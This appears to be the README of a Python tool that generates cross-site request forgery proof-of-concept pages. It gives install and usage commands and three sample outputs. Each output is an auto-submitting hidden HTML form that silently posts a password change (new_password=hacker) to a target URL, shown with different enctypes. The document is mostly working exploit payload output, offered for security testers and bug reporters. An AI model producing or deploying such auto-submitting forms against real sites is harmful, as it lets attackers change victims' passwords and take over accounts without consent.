# CSRF PoC Generator
This is a pyhton script which generates PoC for Cross-site request forgery with autosubmit form. you just need to provide Url, method and parameters.


# Required Package

```python3 -m pip install yattag```

# Usage

# Options
```
root@ghost:~# python3 csrf_poc_gen.py -h
usage: csrf_poc_gen.py [-h] [-m METHOD] [-u URL] [-p PARAMETERS] [-a AUTHOR]
                       [-e ENCTYPE]

This is a pyhton script which generates PoC for Cross-site request forgery
with autosubmit form. you just need to provide Url, method and parameters.

optional arguments:
  -h, --help            show this help message and exit
  -m METHOD, --method METHOD
                        Method
  -u URL, --url URL     url
  -p PARAMETERS, --parameters PARAMETERS
                        Request parameters
  -a AUTHOR, --author AUTHOR
                        Name of Author
  -e ENCTYPE, --enctype ENCTYPE
                        enctype
```



# To Generate PoC 

Note: Parameters should be in the form of key value pair (key=value&key=value).
```
root@ghost:~# python3 csrf_poc_gen.py -u http://example.com -m post -p "new_password=hacker&re_new_password=hacker" 
<html>
  <title>
    This CSRF was found by 
  </title>
  <body>
    <h1>
      This POC was Created By CSRF PoC Generator Tool
    </h1>
    <form action="http://example.com" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="new_password" value="hacker" />
      <input type="hidden" name="re_new_password" value="hacker" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```



# Enctype
it supports 3 enctype ```application/x-www-form-urlencoded```, ```multipart/form-data``` and ```text/plain```.

```
root@ghost:~# python3 csrf_poc_gen.py -u http://example.com -m post -p "new_password=hacker&re_new_password=hacker" -e "text/plain"
<html>
  <title>
    This CSRF was found by 
  </title>
  <body>
    <h1>
      This POC was Created By CSRF PoC Generator Tool
    </h1>
    <form action="http://example.com" method="POST" enctype="text/plain">
      <input type="hidden" name="new_password" value="hacker" />
      <input type="hidden" name="re_new_password" value="hacker" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```



# With Discoverer Name

```
root@ghost:~# python3 csrf_poc_gen.py -u http://example.com -m post -p "new_password=hacker&re_new_password=hacker" -a "Hacker man"
<html>
  <title>
    This CSRF was found by Hacker man
  </title>
  <body>
    <h1>
      This POC was Created By CSRF PoC Generator Tool
    </h1>
    <form action="http://example.com" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="new_password" value="hacker" />
      <input type="hidden" name="re_new_password" value="hacker" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
